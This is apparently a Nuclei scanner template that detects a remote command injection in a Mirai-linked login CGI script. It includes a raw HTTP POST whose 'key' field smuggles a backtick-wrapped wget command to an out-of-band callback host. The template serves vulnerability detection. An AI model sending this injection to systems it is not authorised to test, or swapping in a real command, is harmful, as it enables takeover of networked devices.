id: mirai-unknown-rce
info:
  name: Mirai - Remote Command Injection
  author: gy741
  severity: critical
  description: Mirai has a vulnerability that allows for remote command injection
    due to unsanitized parameters in its login CGI script.
  reference:
  - https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: mirai,rce,oast
  metadata:
    impact: The impact of the Mirai vulnerability is the potential for unauthorized
      remote control of affected devices and use in DDoS attacks.
    recommendation: I recommend promptly patching and updating the affected systems
      to mitigate the risk of Mirai's remote command injection exploit.
requests:
- raw:
  - 'POST /cgi-bin/login.cgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    key='';`wget http://{{interactsh-url}}`;#

    '
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
